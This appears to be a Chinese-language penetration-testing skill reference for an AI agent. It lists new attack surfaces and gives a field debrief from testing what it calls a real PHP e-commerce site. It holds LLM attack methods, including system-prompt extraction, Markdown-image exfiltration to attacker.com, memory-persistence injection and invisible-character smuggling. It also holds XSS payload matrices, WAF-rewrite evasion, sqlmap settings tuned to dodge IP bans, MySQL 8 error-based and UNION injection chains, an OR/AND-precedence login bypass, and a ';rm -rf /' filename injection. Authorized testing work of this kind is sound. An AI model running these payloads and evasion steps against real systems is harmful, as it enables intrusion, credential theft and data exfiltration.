# 新兴攻击面与实战复盘（emerging-reflexion）

> 来源：jiejieskill SKILL.md 拆分（2026-08-11）。由 SKILL.md 相应章节按需加载。

### 6.13 新兴攻击面（2025-2026 趋势）

> 2025-2026 渗透测试核心变化：**AI/LLM 功能被快速叠加到 SaaS**、**API 就是产品本身**、**云原生/Serverless 复杂度爆炸**。以下按攻击面整理，命中即按对应章节深入。

#### AI / LLM 攻击面（OWASP LLM Top 10 + Agentic AI Top 10）
```bash
# 测试基准：OWASP LLM Top 10 v2025（LLM01-10）、OWASP Agentic AI Top 10（AA-01-10）
# 高频漏洞：
#   LLM01 提示注入（直接/间接）       LLM02 敏感信息泄露
#   LLM03 训练数据投毒（RAG投毒）      LLM06 敏感信息泄露（系统提示词）
#   LLM07 系统提示词提取               工具滥用 / Agent 工具链
#   MCP 服务器攻击 / 模型服务器攻击     输出处理（LLM05 输出→DOM/Shell）

# 测试手法
# 1. 系统提示词提取（高价值发现，常含密钥/内部URL/业务逻辑）
#    翻译诱导、Base64 编码、伪造示例、间接指令绕过
# 2. Markdown 图片 src 数据外带
#    让 LLM 输出 ![exfil](https://attacker.com/?data=...) → 渲染时外带
# 3. 记忆持久化注入：让 LLM「记住」每次会话开头调用攻击者控制的 URL/工具
# 4. ASCII Smuggling（不可见字符走私）：隐形外带、绕过内容审查
# 5. 模型服务器攻击：Ollama（CVE-2024-37032/39722、CVE-2025-44779）、
#    MLflow 路径遍历（CVE-2024-1483/1560）、BentoML pickle、Open WebUI SSE 注入
# 工具：Escape DAST LLM 模块 / LLM-GraphQL / Fuzzing GPT（Burp 插件用 LLM 变异 WAF 绕过）
```

#### AI 聊天 API 传输层（易漏点）
```bash
# 关键误区：只测模型层会漏真漏洞——传输层往往没授权
#   AI 聊天常构建在 GraphQL publish/subscribe（AWS AppSync/Hasura/Apollo）上
#   publish mutation 暴露在客户端 schema + 无 resolver 授权 → BOLA/IDOR
# 测试：
#   1. 内省 GraphQL schema → 过滤 chat/session/message/conversation 相关 mutation
#   2. 每个标识符测 BOLA：攻击者 token + 受害者 sessionGuid → 应 403
#   3. 跨用户会话创建：userGuid 是否与 JWT sub 声明校验
#   4. 追踪 session GUID 泄露：WebSocket 订阅流量、日志、相邻 API 端点
# 真实案例：HackerOne Copilot DestroyLlmConversation IDOR、Zendesk Chat IDOR(2025)
#   2026 IEEE S&P：17 个 AI 聊天插件中 8 个 POST 消息历史无认证/完整性校验
```

#### GraphQL 专项
```bash
# 内省（Introspection）：/graphql 发 Introspection Query 拿全 API 地图
{"query":"{__schema{types{name fields{name}}}}"}
#   → 找 admin_password_modify 等危险 mutation 直接调用
# 注入：/graphql 网关聚合 REST → 越权/未鉴权 → 数据泄露、系统接管
# BOLA/IDOR：GraphQL 里对象 ID 常无授权校验
# 工具：Burp GraphQL Raider / LLM-GraphQL（AI 分析 schema 自动打 SSRF/RCE/SQLi）
```

#### 现代客户端漏洞（SPA / 桌面应用）
```bash
# Prototype Pollution：向 Object.prototype 注入属性影响全对象
#   payload: {"__proto__":{"isAdmin":true}} → 检测响应变化
# NoSQL 注入：MongoDB 操作符注入、$ne 绕过认证
#   {"username":{"$ne":null},"password":{"$ne":null}}
# postMessage 滥用：跨源接收器 + 源校验绕过 → 窃取数据/账号接管
# DOM XSS in SPA：innerHTML / document.write / eval / Function()
#   React dangerouslySetInnerHTML、Vue v-html
# Electron 桌面应用（新攻击面）：文件系统滥用、URL handler、XSS 提权、pinning 绕过、Frida 注入
```

#### SSRF via PDF 生成器（浏览器型 SSRF）
```bash
# 服务端把网页渲染成 PDF → 利用无头浏览器做 SSRF
#   1. 抓取 IMDSv2 云凭据 → 写进 DOM → 出现在下载的 PDF
#   2. 支持非 GET 动词（PUT 打 IMDSv2）→ 绕过只校验 GET 的防护
#   3. 禁用 JS 时仍可外带：
#      <img> 盲确认 / <iframe> 渲染内网页进 PDF / <link> file:// 读本地
#      CSS @import / <meta http-equiv="refresh"> 重定向
```

#### 云原生 / Serverless 攻击面
```bash
# Serverless（AWS Lambda 等）
#   1. 事件数据注入：往 SQS/S3 投恶意载荷（如 ";rm -rf /;.jpg"）→ 下游函数不校验执行
#   2. 过度授权的 IAM：单一 God role → 拿一个函数权限 = 全函数权限
#   3. Confused Deputy：导出函数接受 bucket 名参数 → 借角色写内部备份
#   4. 环境变量密钥：控制台/日志明文可见
#   5. Denial of Wallet（烧钱）：循环调用函数 → 数据窃取 + 云账单爆炸
#   6. 孤儿函数：遗留测试函数带 admin 权限 = 金矿
# K8s（深化 8.11）
#   RBAC 通配符：RoleBinding/ClusterRoleBinding 查 '*' 权限
#   ServiceAccount token：/var/run/secrets/kubernetes.io/serviceaccount/token
#   kubectl auth can-i --list -A 权限自检
#   IaC：Terraform/CloudFormation/Helm 模板一个错误 → 几十个资源全复制
# 工具：pacu / ScoutSuite / CSPM 自动化 + 手工链攻击
```

#### 2026 新工具清单
| 工具 | 用途 |
|------|------|
| LLM-GraphQL | AI 驱动 GraphQL 自动漏洞探测（schema→payload→OAST验证）|
| entropy-chaos | LLM 生成多步攻击链 + 五种攻击者画像 + 基线降噪 |
| Interactsh / OAST | 盲打 SSRF / 无回显 RCE 的 OOB 回连验证 |
| Burp GraphQL Raider | GraphQL 内省/注入/批量 |
| Burp Param Miner | 隐藏参数发现（-a 主动模式）|
| Escape DAST | 自动发现 LLM 端点 + OWASP LLM Top10 检测 |

> 🔗 AI/LLM 深挖 → secknowledge `references/ai-app-prompt-1.md`、`ai-model-jailbreak.md`；GraphQL/OAuth/HTTP走私 → secknowledge `references/web-modern-protocols.md`。

### 6.14 实战复盘与踩坑要点（真实目标教训）

> 以下来自对真实 cPanel/PHP 电商站（LiteSpeed + ModSecurity）的实战测试复盘，每条都是实际踩过的坑。**先读，再动手。**

#### 1. 搜索框回显 / XSS 检测（别用一个 grep 就下结论）
```bash
# ⚠️ 教训：参数「疑似有回显」时，单次 grep 找不到 ≠ 不回显
# 回显存在的两条强线索：
#   · sqlmap 提示 "reflective value(s) found and filtering out"
#   · 页面长度随 payload 长度变化（+N 字节）→ 几乎必有回显
# 上次就因只 grep 唯一 token 没找到、漏看 value 属性，误判「不回显」

# 正确做法：带唯一 token 抓页面，多种上下文逐一找
curl -s "$URL/search.php?key=JJXSS123" | grep -oE 'value="[^"]*JJXSS123[^"]*"'   # ① 表单 value 属性（最高频）
curl -s "$URL/search.php?key=JJXSS123" | grep -oE '.{0,40}JJXSS123.{0,40}'        # ② 任意上下文
# ③ 还要看：结果标题「搜索『xxx』的结果」、面包屑、meta、JS 变量、隐藏域
# ④ HTML 实体编码（< → &lt;）：有编码则尝试大小写/嵌套/事件属性绕过

# 搜索框 XSS payload 矩阵（value 属性上下文）
<script>alert(1)</script>
"><script>alert(1)</script>              # 突破 value 属性
" onmouseover="alert(1)                  # 属性内事件
</title><script>alert(1)</script>        # title 跳出
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
# 存储型：把 XSS 存进搜索结果/留言 → 后台触发

# ⚠️ 新教训：WAF 改写 `</` 别误判成「被过滤」
# 现象：输入 `</span><script>alert(1)</script>`，`</span>` 被改写成 `<D:/Git/span>`
#   （过滤器把 `</` 替换成 `<D:/Git/`）→ 一眼像「过滤了」，实则 XSS 照打
# 根因：该过滤器只拦 `</span>` 一个串，对完整标签/事件属性无效
# 应对：一个 payload 被改写/报错 ≠ 没有 XSS，换【不含 `</` 前缀】的向量逐个验证：
#   <script>alert(1)</script>      ← 原样回显 ✅（<span> 文本上下文，无需 value 属性）
#   <img src=x onerror=alert(1)>   ← 原样回显 ✅
#   <svg/onload=alert(1)>          ← 原样回显 ✅
# 附加：过滤器改写泄露开发者本机路径 D:/Git → 顺带记 CWE-200 信息泄露
```

#### 2. OR 型盲注：sqlmap 报误报的根因
```bash
# ⚠️ 教训：sqlmap 报「not injectable / false positive」时，先想清楚为什么，别直接放弃
# 根因：基准词查无结果（0 行）→ AND 型真条件（AND '1'='1'）仍为假 → 布尔差分失效
#      但 OR '1'='1' 恒真 → 返回全部行 → 这是 OR 型盲注（非 AND 型）

# 应对三招：
#   1. 先找一个能命中数据的搜索词当基准 → AND 差分可用
#      （逐个试产品词，页面大小明显变大即有结果）
#   2. 手工用 OR payload 快速确认注入：
#      key=' OR '1'='1' -- -   → 全量返回（len 明显变大）即注入
#   3. 确认后 sqlmap 用 --technique=B + 有效基准词重跑
```

#### 3. WAF 识别先行 + sqlmap 克制使用（避免被封 IP）
```bash
# ⚠️ 教训：默认 sqlmap 数百请求触发 ModSecurity → 源 IP 被限流封锁，整个测试中断
#   共享主机/LiteSpeed/ModSecurity 环境尤其容易触发

# 正确流程：
#   1. 先识别 WAF：wafw00f / 手工（sleep() 被拦返回 403 即存在）
#   2. 自动化前先手工确认注入点 + 有效基准词，别让工具盲扫
#   3. sqlmap 加克制参数：
sqlmap -u "$URL/search.php?key=test" --technique=B --tamper=space2comment \
       --random-agent --delay 2 --level 2 --timeout 20 --batch
#   4. 大请求量前评估环境（生产/共享主机/银行系统），控制风险与频率
#   5. 被封后：等 30-60 分钟 / 换 IP，解封后以更低频率重试
```

#### 4. MySQL 8.x 移除 EXTRACTVALUE/UPDATEXML → 错误型注入失效，版本先行
```bash
# ⚠️ 教训：用 IF+EXTRACTVALUE 做错误型盲注，双分支全报错
#      → 误判「不可利用」。实际是 MySQL 8.4.9：EXTRACTVALUE/UPDATEXML 在 MySQL 8.0+ 已移除，
#      函数不存在 → 真/假两分支都报错，掩盖了真实注入点。
# 次级陷阱：AND 1=1 vs AND 1=2 页面尺寸相同 → 误判布尔盲注不通。
#      实际是页面渲染尺寸不随查询行数变化（固定模板 + DB 填充个别字段）。

# 正确流程：SQLi 判定前【先探数据库版本】，再选注入技术
#   1. 布尔探版本（字符串引号上下文）：
#      id=1' AND SUBSTRING(VERSION(),1,1)='8   # 真→正常页 / 假→无行页
#   2. MySQL 8 错误型注入改用仍存在的触发方式：
#      AND GTID_SUBSET(CONCAT(0x7e,(SELECT VERSION())),1)   # 或
#      AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x \
#           FROM information_schema.tables GROUP BY x)a)
#   3. 拿不准就纯布尔/联合，别死磕错误回显（display_errors 常被关）
```

#### 5. 页面尺寸 ≠ oracle：用「内容级布尔差分」+ 逐层确认链
```bash
# ⚠️ 教训：页面总尺寸不随行数变时，布尔/时间盲注全失效，但不能据此判死。
#     正确 oracle 是比较【具体内容】——真/假条件下正文/title/图片有/无。

# 完整验证链（字符串引号上下文 WHERE id='$id'，一次跑通）：
#   ① 内容差分建 oracle（拿存在行 vs 不存在行，比 md5/正文）：
#      id=1（有行）    → <h3>關於祥禾</h3> + 正文
#      id=99999（无行） → <h3></h3> 空
#   ② 布尔注入确认（注意用引号闭合变体，裸 `AND 1=1` 常被过滤/失效）：
#      id=99999' OR '1'='1   真 → 有行内容
#      id=99999' OR '1'='2   假 → 无行内容
#      id=1' AND '1'='1      真 → 有行内容
#      id=1' AND '1'='2      假 → 无行内容
#   ③ 注释确认：id=1'-- - 正常
#   ④ ORDER BY 二分列数：1' ORDER BY 10-- - 正常 / 11 报错 → 列数=10
#   ⑤ UNION 找回显列：id=99999' UNION SELECT 1,2,...,N-- - 看哪个数字出现在页面
#   ⑥ 提取 PoC：UNION SELECT 1,VERSION(),DATABASE(),USER()...（放回显列）
# 通用原则：先用存在/不存在行确立内容差分；AND 型不行就换 OR 型；
#      注释/引号闭合/列数/UNION 逐层推进，确认一个注入点后【同模板其他入口逐个测】
#      （product-details.php/page.php/shop.php 等单引号同样报错 = 疑似同类，别只盯一个）
# ⚠️ 同站不同接口 WAF 行为可能不一致：
#     about.php 放行 UNION SELECT，但注册接口 email 的 AND SLEEP 被 403 拦。
#     → 别用 A 接口的 WAF 行为推断 B 接口；每个注入面单独探测关键字是否被拦。
#     → 认证表单（登录/注册/找回）同样要测注入：登录常走转义+密码哈希（绕不过），
#       但注册 email 可能裸拼接（引号→SQL错误→空响应 = 第二个注入面）。
```

#### 6. LiteSpeed「One moment, please...」反爬 JS 挑战会中断自动化
```bash
# ⚠️ 教训：连续高频请求（尤其 POST）后，全站所有请求（含 GET）返回约 12KB 挑战页
#     "One moment, please..."（<title>Loader</title> + 5 秒自动 reload 的 JS 挑战），
#     curl 无法执行 JS → 全站测试中断，cookie jar 为空（JS 计算型 challenge）。
# 特征识别：正常页 90KB → 突然全部 11-12KB；title 变 One moment, please

# 应对：
#   1. 放慢节奏：请求间 sleep 2-3s，统一真实浏览器 UA + Referer，全程带 cookie 会话
#   2. 挑战窗口约 90 秒自动过期，等窗口过了再继续（别硬闯）
#   3. 挑战触发前已确认的 GET 型漏洞（反射 XSS 等）先记录留证，别指望被封后还能复现
#   4. 批量脚本加 --delay 和重试退避；触发后立即停手换策略
```

#### 7. 漏洞复现必须产出「小白可操作」的详细手册（Burp/浏览器逐步骤）
```bash
# ⚠️ 教训：结论再对，复现只给一行 URL+payload → 客户/队友/未来的自己都验证不了，
#     报告价值直接打折。复现手册默认读者【不懂注入原理、不会 Burp 抓包】——
#     "小白来了也会" = 每一步写明：打开什么 → 点哪里 → 粘贴什么 → 应该看到什么。

# 复现手册固定结构（必含 6 项）：
#   ① 前置条件：授权范围、目标 URL、测试账号（如有）、所需工具（Burp/curl/浏览器）
#   ② 环境准备：
#      · Burp：Proxy → Proxy settings 确认监听 127.0.0.1:8080
#      · 浏览器挂代理：Proxy 设置手动 127.0.0.1:8080（或 FoxyProxy 一键切换）
#        最简单：直接点 Burp Proxy → Intercept 页的 Open Browser（内置浏览器已配好代理）
#      · HTTPS 抓包：浏览器访问 http://burp → 下载并安装 CA 证书
#      · 确认能抓到包：浏览器开目标站点任意 HTTPS 页面 → Burp HTTP history 有记录
#   ③ 分步操作（Burp 版 / curl 版两套，每步给预期结果）：
#      · Burp：抓包 → 目标请求右键 Send to Repeater → 改参数 → Send → 看 Response
#      · curl：--get --data-urlencode 避免编码问题；-sk 跳过证书；-H 带浏览器 UA
#   ④ 完整请求包 + 关键响应片段（可直接复制进 Repeater）
#   ⑤ 判定标准（具体可验证的命中特征）：
#      布尔差分：真→页面含正文 / 假→标题空；UNION：版本号出现在面包屑；XSS：alert 弹窗
#      绝不写"漏洞存在"这种无法核验的结论，必须给"看到什么才算复现成功"
#   ⑥ 注意事项：反爬（One moment please→停手等90s）、速率（间隔2-3s）、合规（授权内操作）
#      + 修复建议一句话

# 产出形态：实战报告每个漏洞附一份；或单列 manual_repro 附录。
```

#### 8. 弱口令测试必须用「真实存在的账号」+ 区分「账号不存在 vs 密码错误」
```bash
# ⚠️ 教训：拿 admin/0001/1001 这些【猜测的账号】测弱口令全失败，
#     就误判「无弱口令」。实际这些账号在表里根本不存在——用不存在的账号测密码永远「密码错误」。
# 正确流程：
#   1. 先确认账号是否真实存在：错误回显的差异，或布尔盲注探测（见下）
#   2. 登录失败响应要区分两种分支（size/提示不同）：
#      账号不存在 → 与「密码错误」不是一回事，别混为一谈
#   3. 用真实账号（盲注枚举出的 <user_id>/工号）再测弱口令字典
# 本例：先盲注提取第一条 <user_id>=<工号A>（但 <password>=NULL=未设密码，测不出），
#     后枚举 <password>='123' 命中 <工号B>、<工号C> 两个真实弱口令账号。
```

#### 9. `' or '1'='1` 无注释也能登录 —— AND 优先级把登录框变成「弱口令探针」
```bash
# ⚠️ 教训：误判 test' or '1'='1 失败是因为「引号没闭合/没注释尾部」，
#     实际不是。登录 SQL 为：select * from <user_table> where <user_id>='<id>' and <password>='<password>'
# 拼接 test' or '1'='1 + 密码 123 得：
#   where <user_id>='test' or '1'='1' and <password>='123'
# MSSQL 里 AND 优先级 > OR，等价于：
#   <user_id>='test' OR ('1'='1' AND <password>='123')
# 当密码 123 恰是某员工真实密码 → 括号内恒真 → 整个 WHERE 恒真 → 返回表第一行 → 登录成功！
# → 结论：test' or '1'='1 + 密码 P 本质是【弱口令探针】：P 命中任一员工真实密码即绕过。
#   实测 123、123456 都能登录；密码 x 则失败（无人用 x）。
# 通用启示：登录框 SQLi 别只看 OR 1=1-- - 绕过，还要会读【AND 优先级】下的表达式语义，
#   同一个 payload 换不同密码，可能从「语法错误」变成「登录成功」，密码真假才是变量。
```

---

